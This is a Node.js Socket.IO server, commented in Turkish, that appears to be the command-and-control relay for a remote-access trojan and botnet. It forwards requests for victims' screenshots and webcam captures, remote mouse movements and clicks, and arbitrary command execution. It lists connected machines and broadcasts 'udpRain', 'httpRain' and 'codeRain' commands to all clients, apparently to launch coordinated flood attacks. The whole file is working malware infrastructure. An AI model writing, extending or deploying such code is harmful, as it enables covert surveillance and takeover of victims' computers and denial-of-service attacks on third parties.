const info = { port: 3033 };
const path = require('path');
const app = require('express')();
const server = require('http').createServer(app);
const io = require('socket.io')(server, {
    maxHttpBufferSize: 10 * 1024 * 1024, // 10MB (daha makul bir limit)
    pingTimeout: 60000,
    cors: {
        origin: '*',
        methods: ['GET', 'POST']
    }
});

// Basit route'lar
app.get('/test', (req, res) => {
    res.send('The application works');
});



// Socket.IO olay yönetimi
io.on('connection', (socket) => {
    console.log(`Connected: ${socket.id}`);

    socket.on('disconnect', () => {
        console.log(`Disconnected: ${socket.id}`);
        // Odaya katılmışsa çıkarma işlemleri eklenebilir
    });

    socket.on('joinToRoom', (data) => {
        if (!data.roomName || typeof data.roomName !== 'string') {
            return socket.emit('error', 'Invalid room name');
        }
        socket.join(data.roomName);
        console.log(`[${socket.id}] joined room [${data.roomName}]`);
    });

    // Ortak olay işleyici
    const handleRelayEvent = (eventName) => {
        return (data) => {
            if (!data || !data.from) {
                return socket.emit('error', `Invalid ${eventName} data`);
            }
            io.to(data.from).emit(eventName, data);
        };
    };

    // Olaylar için relay işlemleri
    [
        'screenshotRequest',
        'camShotRequest',
        'screenshotResponse',
        'camShotResponse',
        'mousemove',
        'click',
        'getRunResponse'
    ].forEach(event => {
        socket.on(event, handleRelayEvent(event));
    });

    // Özel komut işleme
    socket.on('getRunRequest', (data) => {
        if (!data || !data.cmd || !data.from) {
            return socket.emit('error', 'Invalid command data');
        }

        const { cmd, from } = data;

        if (cmd === 'getUsers') {
            const rooms = Array.from(io.sockets.adapter.rooms);
            io.to(from).emit('getRunResponse', {
                ...data,
                cmd: rooms.join('\r\n')
            });
        }
        else if (['udpRain', 'httpRain', 'codeRain'].some(term => cmd.includes(term))) {
            console.log(`${cmd.split(' ')[0]} triggered on server`);
            io.emit('getRunRequest', data);
        }
        else {
            io.to(from).emit('getRunRequest', data);
        }
    });
});

// Sunucuyu başlat
server.listen(info.port, () => {
    console.log(`Server listening on port ${info.port}`);
});

// Hata yönetimi
server.on('error', (err) => {
    console.error('Server error:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled rejection:', err);
});

module.exports = server;